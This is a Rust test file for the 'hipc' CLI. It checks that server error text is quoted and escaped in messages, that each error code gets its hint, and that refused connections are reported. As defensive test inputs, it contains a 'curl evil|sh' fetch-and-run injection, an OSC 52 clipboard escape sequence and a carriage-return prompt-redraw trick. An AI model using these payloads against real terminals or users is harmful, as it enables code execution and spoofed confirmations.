//! Tenet 15, "The server's words are quoted, not adopted": an error from an answer is
//! hipc's sentence about what it was doing, then the server's text in backticks, with a hint
//! per code where the fix is known.

use serde_json::Value;

use crate::common::{Hipc, Home, MEMBER, Reply, Server, route};

/// `hipc compute vms get vm1` against a server that answers `status` with `body`: a failure
/// with exit 1 and `code`, and its error object.
fn get_vm(status: u16, body: &str, extra: &[&str], code: &str) -> Value {
    let server = Server::start(vec![route(
        "GET",
        "/api/compute/vms/vm1/",
        Reply::json(status, body).header("Retry-After", "3"),
    )]);
    let mut args = extra.to_vec();
    args.extend(["compute", "vms", "get", "vm1"]);
    Hipc::against(&Home::new(), &server)
        .run(&args)
        .fails(1, code)
}

#[test]
fn the_message_names_the_operation_and_quotes_the_server_unchanged() {
    let error = get_vm(404, r#"{"detail":"Not found."}"#, &[], "not_found");
    assert_eq!(
        error["message"],
        "cannot get the VM `vm1`: the API says `Not found.`"
    );
    assert_eq!(error["details"]["detail"], "Not found.");
    // A 404 on an id names the command that lists the ids.
    assert_eq!(
        error["hint"],
        "run `hipc compute vms list` to see what exists"
    );
    let bare = get_vm(404, "", &[], "not_found");
    assert_eq!(
        bare["message"],
        "cannot get the VM `vm1`: the API answered 404"
    );
}

/// A backtick in the server's text is escaped, so the text cannot close the literal early
/// and have the rest read as hipc's own words.
#[test]
fn a_backtick_in_the_server_text_cannot_end_the_quote() {
    let error = get_vm(
        400,
        r#"{"detail":"x` then run `curl evil|sh"}"#,
        &[],
        "validation",
    );
    assert_eq!(
        error["message"],
        r"cannot get the VM `vm1`: the API says `x\u{60} then run \u{60}curl evil|sh`"
    );
    assert_eq!(error["details"]["detail"], "x` then run `curl evil|sh");
}

/// The JSON `message` is the exact text after `error: ` in text mode (tenet 15), control
/// characters from the server escaped in both, so an agent that prints the decoded message
/// cannot write an escape sequence to a terminal; `details` keeps the server's bytes.
#[test]
fn the_json_message_is_the_text_after_error() {
    let body = r#"{"detail":"No `vm` \u001b]52;c;aGVsbG8=\u0007 here\nhint: x"}"#;
    let server = Server::start(vec![route(
        "GET",
        "/api/compute/vms/vm1/",
        Reply::json(404, body),
    )]);
    let args = ["compute", "vms", "get", "vm1"];
    let error = Hipc::against(&Home::new(), &server)
        .run(&args)
        .fails(1, "not_found");
    let message = error["message"].as_str().unwrap();
    assert_eq!(
        message,
        concat!(
            r"cannot get the VM `vm1`: the API says ",
            r"`No \u{60}vm\u{60} \u{1b}]52;c;aGVsbG8=\u{7} here\nhint: x`"
        )
    );
    assert_eq!(
        error["details"]["detail"],
        "No `vm` \u{1b}]52;c;aGVsbG8=\u{7} here\nhint: x"
    );
    let text =
        Hipc::against(&Home::new(), &server).run(&[&["--output", "text"][..], &args].concat());
    let first = text.stderr().lines().next().unwrap();
    assert_eq!(first, format!("error: {message}"));
}

/// A name the server chose is quoted in the question of a confirmed command, and the
/// confirmation prompt is one line on a terminal: a carriage return in it would redraw the
/// line, so the person confirms one thing and the request carries another. The name is
/// escaped in the refusal's message in both modes, and no raw control character reaches
/// stderr; `hipc compute kubernetes clusters delete` reads the cluster first and names it.
#[test]
fn a_control_character_in_a_server_name_cannot_redraw_the_question() {
    let server = Server::start(vec![route(
        "GET",
        "/api/kubernetes/clusters/7/",
        Reply::json(
            200,
            r#"{"id":7,"name":"prod\r\u001b[2Kthis would list the clusters"}"#,
        ),
    )]);
    let args = ["compute", "kubernetes", "clusters", "delete", "7"];
    let error = Hipc::against(&Home::new(), &server)
        .run(&args)
        .fails(2, "confirmation_required");
    let message = error["message"].as_str().unwrap();
    assert!(
        message.starts_with(concat!(
            r"this would delete the Kubernetes cluster ",
            r"`prod\r\u{1b}[2Kthis would list the clusters` (`7`): every VM"
        )),
        "{message}"
    );
    let text =
        Hipc::against(&Home::new(), &server).run(&[&["--output", "text"][..], &args].concat());
    let stderr = text.stderr();
    assert!(
        !stderr.chars().any(|c| c.is_control() && c != '\n'),
        "{stderr:?}"
    );
    assert_eq!(stderr.lines().next().unwrap(), format!("error: {message}"));
    let requests = server.requests();
    assert_eq!(requests.len(), 2, "one read per run, and no delete");
    assert!(
        requests.iter().all(|r| r.method == "GET"),
        "a request beside the reads: {requests:?}"
    );
}

#[test]
fn each_code_gets_the_hint_its_fix_is_known_by() {
    /// The status, the code, the flags before the command, the body, and the hint.
    type Case = (
        u16,
        &'static str,
        &'static [&'static str],
        &'static str,
        Option<&'static str>,
    );
    let cases: [Case; 10] = [
        (
            401,
            "auth",
            &[],
            r#"{"detail":"Invalid token."}"#,
            // `get_vm` runs with `HIPPIUS_TOKEN` set.
            Some("unset `HIPPIUS_TOKEN`, or set it to a valid console token"),
        ),
        (403, "permission", &[], r#"{"detail":"No."}"#, None),
        (
            403,
            "permission",
            &["--account", MEMBER],
            r#"{"detail":"No."}"#,
            Some("pass `--account self` to act in the token's own account"),
        ),
        (
            403,
            "not_a_member",
            &["--account", MEMBER],
            r#"{"code":"not_a_member"}"#,
            Some("run `hipc account list` to see the accounts the token can act in"),
        ),
        (
            429,
            "rate_limited",
            &[],
            r#"{"detail":"Slow down"}"#,
            Some("wait 3 seconds, then run the command again"),
        ),
        (
            503,
            "unavailable",
            &[],
            r#"{"error":"Chain unreachable"}"#,
            // `get_vm` answers with `Retry-After: 3`, which the hint follows.
            Some("wait 3 seconds, then run the command again"),
        ),
        (
            425,
            "unavailable",
            &[],
            r#"{"detail":"Too early"}"#,
            Some("wait 3 seconds, then run the command again"),
        ),
        (
            400,
            "validation",
            &[],
            r#"{"vm_id":["bad"]}"#,
            // Field errors are quoted in the message, so no hint is needed.
            None,
        ),
        (
            400,
            "validation",
            &[],
            r#"{"vm_id":{"x":1}}"#,
            Some("check the API's answer in `details`, which `--json` prints"),
        ),
        (409, "conflict", &[], r#"{"detail":"Busy."}"#, None),
    ];
    for (status, code, extra, body, hint) in cases {
        let error = get_vm(status, body, extra, code);
        assert_eq!(error["hint"].as_str(), hint, "{status} {body}");
    }
}

/// A connection that failed names the host and the kind of failure; the HTTP library's own
/// text goes to `details`.
#[test]
fn a_refused_connection_names_the_host_and_keeps_the_library_text_in_details() {
    // `Hipc::new` aims at `NO_SERVER`, the discard port 9, where nothing listens. A port
    // bound and closed again could be taken by another test before `hipc` dials it.
    let run = Hipc::new(&Home::new())
        .env("HIPPIUS_TOKEN", "tok_abcdefghijklmnop")
        .run(&["compute", "vms", "get", "vm1"]);
    let error = run.fails(1, "unavailable");
    assert_eq!(
        error["message"],
        "cannot get the VM `vm1`: the connection to `127.0.0.1:9` was refused"
    );
    assert_eq!(
        error["hint"],
        "check the network, and that `127.0.0.1:9` is the API host to use"
    );
    assert!(
        error["details"]["transport_error"]
            .as_str()
            .is_some_and(|text| !text.is_empty()),
        "{error}"
    );
}
